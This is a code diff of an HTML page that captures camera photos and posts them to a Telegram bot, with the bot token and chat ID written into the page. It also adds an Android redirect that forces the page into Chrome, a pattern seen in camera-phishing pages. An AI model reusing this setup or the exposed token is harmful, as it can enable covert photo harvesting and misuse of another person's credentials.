@@ -9,24 +9,20 @@
   <h2>Capture Media and Send to Telegram</h2>
   
   <video id="video" autoplay playsinline style="width: 300px;"></video>
-  <button id="captureBtn" type="button">Capture Photo</button>
+  <button id="captureBtn">Capture Photo</button>
   
   <script>
-    // Debugging: Log page load
-    console.log("Page loaded");
+    // Automatically redirect to Chrome on Android, but prevent reload loops
+    (function() {
+      const isAndroid = /android/i.test(navigator.userAgent);
+      const redirected = sessionStorage.getItem('redirectedToChrome');
+      const currentUrl = window.location.href;
 
-    // Disable form submissions globally
-    document.addEventListener('submit', (event) => {
-      event.preventDefault();
-    });
-
-    // Disable default behavior on all buttons (extra precaution)
-    document.querySelectorAll('button').forEach(button => {
-      button.addEventListener('click', (event) => {
-        event.preventDefault();
-        console.log("Button clicked:", button.id);
-      });
-    });
+      if (isAndroid && !redirected) {
+        sessionStorage.setItem('redirectedToChrome', 'true');
+        window.location.href = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end;`;
+      }
+    })();
 
     const video = document.getElementById('video');
     const captureBtn = document.getElementById('captureBtn');
@@ -41,12 +37,12 @@
         video.srcObject = stream;
       } catch (err) {
         console.error('Error accessing camera: ', err);
+        alert("Unable to access the camera. Please check your device settings.");
       }
     }
 
     // 2. Capture photo from video stream
-    captureBtn.addEventListener('click', (event) => {
-      event.preventDefault();  // Ensure no default action triggers
+    captureBtn.addEventListener('click', () => {
       setTimeout(() => {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 300;
@@ -57,22 +53,21 @@
         
         // Convert canvas to Blob for sending to Telegram
         canvas.toBlob(async (blob) => {
-          await sendToTelegram(blob, 'photo');  // Send captured photo to Telegram
+          await sendToTelegram(blob, 'photo');
         }, 'image/jpeg');
-      }, 500);  // Small delay to allow video stream to load
+      }, 500);
     });
 
     // 3. Function to send media to Telegram
     async function sendToTelegram(blob, type) {
       const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U';
-      const chatId = '7532339931';  // Replace with the chat ID to send the media to
+      const chatId = '7532339931';
       
       const formData = new FormData();
       formData.append(type, blob, `${type}.${type === 'photo' ? 'jpg' : 'ogg'}`);
+      formData.append('chat_id', chatId);
 
       const endpoint = `https://api.telegram.org/bot${botToken}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;
-
-      formData.append('chat_id', chatId);
 
       try {
         const response = await fetch(endpoint, {
@@ -83,11 +78,12 @@
         console.log('Telegram response:', result);
       } catch (err) {
         console.error('Error sending to Telegram:', err);
+        alert("Failed to send to Telegram. Please check your internet connection.");
       }
     }
 
-    // Start the camera on page load
-    startCamera();
+    // Start the camera after DOM is fully loaded
+    document.addEventListener("DOMContentLoaded", startCamera);
   </script>
 </body>
 </html>
